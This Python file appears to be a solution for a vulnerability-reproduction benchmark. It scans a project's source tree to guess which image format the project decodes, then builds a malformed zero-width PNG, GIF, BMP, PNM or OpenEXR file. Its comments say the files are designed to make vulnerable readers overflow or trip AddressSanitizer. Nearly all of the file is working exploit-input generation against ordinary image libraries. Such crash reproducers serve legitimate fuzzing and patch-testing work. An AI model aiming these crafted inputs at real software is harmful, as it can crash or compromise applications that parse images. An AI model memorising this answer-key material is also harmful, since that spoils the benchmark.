import os
import re
import tarfile
import struct
import binascii
import zlib
from typing import Dict, Iterable, Tuple, Optional


def _is_probably_text_filename(name: str) -> bool:
    n = name.lower()
    if n.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.inc', '.inl', '.m', '.mm',
                   '.py', '.go', '.rs', '.java', '.kt', '.cs', '.js', '.ts', '.tsx',
                   '.cmake', 'cmakelists.txt', '.gn', '.gni', '.ninja', '.mk', 'makefile',
                   '.yaml', '.yml', '.json', '.toml', '.ini', '.cfg', '.txt', '.md',
                   '.sh', '.bash', '.zsh', '.bat', '.ps1')):
        return True
    if any(x in n for x in ('fuzz', 'fuzzer', 'oss-fuzz', 'sanitizer')):
        if n.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.py', '.txt', '.md', '.sh', '.cmake', '.mk')):
            return True
    return False


def _iter_source_text_blobs(src_path: str, max_files: int = 2500, max_bytes_per_file: int = 200_000) -> Iterable[Tuple[str, str]]:
    if os.path.isdir(src_path):
        count = 0
        for root, _, files in os.walk(src_path):
            for fn in files:
                if count >= max_files:
                    return
                path = os.path.join(root, fn)
                rel = os.path.relpath(path, src_path)
                if not _is_probably_text_filename(rel):
                    continue
                try:
                    with open(path, 'rb') as f:
                        b = f.read(max_bytes_per_file)
                    s = b.decode('latin1', errors='ignore')
                except Exception:
                    continue
                count += 1
                yield rel, s
        return

    try:
        with tarfile.open(src_path, 'r:*') as tf:
            count = 0
            for m in tf.getmembers():
                if count >= max_files:
                    return
                if not m.isfile():
                    continue
                name = m.name
                if not _is_probably_text_filename(name):
                    continue
                if m.size <= 0:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    b = f.read(max_bytes_per_file)
                    s = b.decode('latin1', errors='ignore')
                except Exception:
                    continue
                count += 1
                yield name, s
    except Exception:
        return


def _basename_tokens(src_path: str) -> str:
    base = os.path.basename(src_path).lower()
    for ext in ('.tar.gz', '.tgz', '.tar.xz', '.txz', '.tar.bz2', '.tbz2', '.tar', '.zip', '.gz', '.xz', '.bz2'):
        if base.endswith(ext):
            base = base[:-len(ext)]
            break
    return base


def _score_format(src_path: str) -> Dict[str, int]:
    scores: Dict[str, int] = {
        'png': 0,
        'exr': 0,
        'gif': 0,
        'bmp': 0,
        'tiff': 0,
        'jpeg': 0,
        'qoi': 0,
        'pnm': 0,
    }

    base = _basename_tokens(src_path)
    def bump(fmt: str, v: int) -> None:
        scores[fmt] = scores.get(fmt, 0) + v

    if 'exr' in base or 'openexr' in base or 'tinyexr' in base:
        bump('exr', 40)
    if 'png' in base or 'spng' in base or 'lodepng' in base:
        bump('png', 30)
    if 'gif' in base:
        bump('gif', 20)
    if 'bmp' in base:
        bump('bmp', 20)
    if 'tiff' in base or 'tif' in base:
        bump('tiff', 20)
    if 'jpeg' in base or 'jpg' in base:
        bump('jpeg', 20)
    if 'qoi' in base:
        bump('qoi', 20)
    if 'pnm' in base or 'ppm' in base or 'pgm' in base or 'pbm' in base or 'netpbm' in base:
        bump('pnm', 20)

    # Strong indicators inside fuzzers / sources
    rx = {
        'exr': [
            (re.compile(r'\bLoadEXR\b', re.I), 80),
            (re.compile(r'\bParseEXRHeader\b', re.I), 80),
            (re.compile(r'\bTinyEXR\b', re.I), 60),
            (re.compile(r'\bOpenEXR\b', re.I), 60),
            (re.compile(r'\bImf::', re.I), 60),
            (re.compile(r'\bImf[A-Za-z0-9_]*\b', re.I), 20),
            (re.compile(r'\bEXR\b', re.I), 10),
        ],
        'png': [
            (re.compile(r'\bspng_', re.I), 100),
            (re.compile(r'\blodepng_', re.I), 90),
            (re.compile(r'\bpng_(create|read|set|get|destroy|sig)\w*', re.I), 60),
            (re.compile(r'\bIHDR\b', re.I), 20),
            (re.compile(r'\bIDAT\b', re.I), 20),
            (re.compile(r'\bPNG\b', re.I), 5),
        ],
        'gif': [
            (re.compile(r'\bDGif(Open|Slurp|Close)\b', re.I), 90),
            (re.compile(r'\bEGif(Open|Close)\b', re.I), 50),
            (re.compile(r'\bgiflib\b', re.I), 60),
            (re.compile(r'\bnsgif\b', re.I), 80),
            (re.compile(r'\bGIF89a\b', re.I), 10),
        ],
        'bmp': [
            (re.compile(r'\bBITMAP(INFOHEADER|FILEHEADER)\b', re.I), 80),
            (re.compile(r'\bbiWidth\b', re.I), 30),
            (re.compile(r'\bbiHeight\b', re.I), 30),
            (re.compile(r'\bbs?bmp\b', re.I), 40),
            (re.compile(r'\bbmp\b', re.I), 5),
        ],
        'tiff': [
            (re.compile(r'\bTIFF(Open|ClientOpen|ReadRGBAImage|ReadScanline|ReadEncodedStrip)\b', re.I), 90),
            (re.compile(r'\blibtiff\b', re.I), 60),
            (re.compile(r'\bTIFF\b', re.I), 10),
        ],
        'jpeg': [
            (re.compile(r'\bjpeg_(read|create|destroy|start|finish)\w*', re.I), 70),
            (re.compile(r'\bturbojpeg\b', re.I), 70),
            (re.compile(r'\bJFIF\b', re.I), 20),
            (re.compile(r'\bJPEG\b', re.I), 10),
        ],
        'qoi': [
            (re.compile(r'\bqoi_decode\b', re.I), 120),
            (re.compile(r'\bQOI\b', re.I), 20),
        ],
        'pnm': [
            (re.compile(r'\bnetpbm\b', re.I), 70),
            (re.compile(r'\b(ppm|pgm|pbm)\b', re.I), 20),
            (re.compile(r'\bP[1-6]\b', re.I), 5),
        ],
    }

    for name, text in _iter_source_text_blobs(src_path):
        n = name.lower()
        if 'fuzz' in n or 'fuzzer' in n:
            bump_val = 15
            for fmt in scores:
                if fmt in n:
                    bump(fmt, bump_val)

        for fmt, rules in rx.items():
            for r, w in rules:
                if r.search(text):
                    bump(fmt, w)

        # If we found a fuzzer entrypoint, add weight to the formats indicated in that file
        if 'llvmfuzzertestoneinput' in text.lower():
            for fmt, rules in rx.items():
                add = 0
                for r, w in rules:
                    if r.search(text):
                        add += w
                if add:
                    bump(fmt, 50 + add // 4)

    return scores


def _png_chunk(typ4: bytes, data: bytes) -> bytes:
    return struct.pack(">I", len(data)) + typ4 + data + struct.pack(">I", binascii.crc32(typ4 + data) & 0xffffffff)


def _make_png_zero_width(height: int = 256, bit_depth: int = 8, color_type: int = 2, interlace: int = 0) -> bytes:
    # width == 0 triggers the issue, height > 1 increases chance of ASan reporting even if malloc(0) behaves oddly.
    width = 0
    ihdr = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, 0, 0, interlace)
    # Each scanline is: filter byte + rowbytes. rowbytes is 0 when width=0, so 1 byte per row.
    raw = b"\x00" * height
    comp = zlib.compress(raw, 9)
    out = bytearray()
    out += b"\x89PNG\r\n\x1a\n"
    out += _png_chunk(b'IHDR', ihdr)
    out += _png_chunk(b'IDAT', comp)
    out += _png_chunk(b'IEND', b'')
    return bytes(out)


def _make_gif_zero_width(height: int = 1) -> bytes:
    # Minimal GIF with logical screen width=0, height=height.
    # Uses a tiny 2-color global color table and a minimal image block.
    header = b"GIF89a"
    lsd = struct.pack("<HHBBB", 0, height, 0xF0, 0x00, 0x00)  # GCT flag=1, color res=7, size=2
    gct = b"\x00\x00\x00" + b"\xff\xff\xff"
    img_desc = b"\x2c" + struct.pack("<HHHHB", 0, 0, 0, height, 0x00)
    lzw_min = b"\x02"
    # Minimal image data stream (works for many decoders even if dimensions are invalid)
    img_data = b"\x02\x4c\x01\x00"
    trailer = b"\x3b"
    return header + lsd + gct + img_desc + lzw_min + img_data + trailer


def _make_bmp_zero_width(height: int = 1, bpp: int = 24) -> bytes:
    # BITMAPFILEHEADER (14) + BITMAPINFOHEADER (40) + no pixel data
    # width==0, height>0
    width = 0
    row_size = ((bpp * width + 31) // 32) * 4
    img_size = row_size * abs(height)
    off_bits = 14 + 40
    file_size = off_bits + img_size
    bf = struct.pack("<2sIHHI", b"BM", file_size, 0, 0, off_bits)
    bi = struct.pack("<IIIHHIIIIII",
                     40,
                     width & 0xffffffff,
                     height & 0xffffffff,
                     1,
                     bpp,
                     0,
                     img_size,
                     2835,
                     2835,
                     0,
                     0)
    return bf + bi  # no pixel data needed


def _make_pnm_zero_width(height: int = 1) -> bytes:
    # Binary PPM (P6) with width=0
    # Many decoders treat this as invalid; if not checked it can lead to issues.
    hdr = f"P6\n0 {height}\n255\n".encode("ascii")
    # Provide some extra bytes to avoid EOF assumptions
    return hdr + (b"\x00" * 64)


def _exr_attr(name: str, typ: str, value: bytes) -> bytes:
    nb = name.encode('ascii') + b'\x00'
    tb = typ.encode('ascii') + b'\x00'
    return nb + tb + struct.pack("<I", len(value)) + value


def _make_exr_zero_width() -> bytes:
    # Minimal scanline EXR with dataWindow width computed as 0 (max_x = min_x - 1).
    # Some vulnerable readers fail to validate this and then overflow later.
    magic = struct.pack("<I", 20000630)  # 0x01312f76
    version = struct.pack("<I", 2)       # v2, no flags
    min_x, min_y, max_x, max_y = 0, 0, -1, 0  # width=0, height=1

    # channels: one HALF channel "R"
    ch = bytearray()
    ch += b"R\x00"
    ch += struct.pack("<i", 1)  # HALF
    ch += b"\x00"               # pLinear
    ch += b"\x00\x00\x00"       # reserved
    ch += struct.pack("<i", 1)  # xSampling
    ch += struct.pack("<i", 1)  # ySampling
    ch += b"\x00"               # end of channel list
    channels = bytes(ch)

    compression = b"\x00"  # NO_COMPRESSION
    line_order = b"\x00"   # increasing y
    par = struct.pack("<f", 1.0)
    swc = struct.pack("<ff", 0.0, 0.0)
    sww = struct.pack("<f", 1.0)
    box = struct.pack("<iiii", min_x, min_y, max_x, max_y)

    header = bytearray()
    header += magic + version
    header += _exr_attr("channels", "chlist", channels)
    header += _exr_attr("compression", "compression", compression)
    header += _exr_attr("dataWindow", "box2i", box)
    header += _exr_attr("displayWindow", "box2i", box)
    header += _exr_attr("lineOrder", "lineOrder", line_order)
    header += _exr_attr("pixelAspectRatio", "float", par)
    header += _exr_attr("screenWindowCenter", "v2f", swc)
    header += _exr_attr("screenWindowWidth", "float", sww)
    header += b"\x00"  # end of header

    # Height computed as 1 => offset table with 1 entry.
    # Put one minimal chunk after the table.
    offset_table_size = 8
    chunk_offset = len(header) + offset_table_size
    offset_table = struct.pack("<Q", chunk_offset)

    # One scanline chunk. Use a small non-zero data_size with some bytes to increase surface area.
    # Readers should reject due to width==0; fixed versions should stop earlier.
    y = 0
    data = b"\x00" * 4096
    chunk = struct.pack("<iI", y, len(data)) + data

    return bytes(header) + offset_table + chunk


class Solution:
    def solve(self, src_path: str) -> bytes:
        scores = _score_format(src_path)

        # Prefer unambiguous EXR if detected strongly.
        fmt = max(scores.items(), key=lambda kv: kv[1])[0]
        if scores.get('exr', 0) >= max(scores.get('png', 0), scores.get('gif', 0), scores.get('bmp', 0)) + 60:
            fmt = 'exr'

        if fmt == 'exr':
            return _make_exr_zero_width()
        if fmt == 'gif':
            return _make_gif_zero_width(height=64)
        if fmt == 'bmp':
            return _make_bmp_zero_width(height=64)
        if fmt == 'pnm':
            return _make_pnm_zero_width(height=64)
        # Default to PNG.
        return _make_png_zero_width(height=512, color_type=2, interlace=0)